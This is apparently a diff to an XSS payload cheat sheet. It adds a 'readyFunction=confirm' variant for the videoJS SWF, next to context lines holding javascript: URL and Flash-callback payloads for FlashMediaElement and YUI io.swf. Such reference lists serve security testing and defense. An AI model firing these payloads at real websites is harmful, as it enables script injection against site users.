@@ -120,7 +120,7 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 
 - FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>
 
-- videoJS: `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`
+- videoJS: `video-js.swf?readyFunction=confirm` and `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`
 
 - YUI "io.swf": `io.swf?yid=\"));}catch(e){alert(document.domain);}//`
 
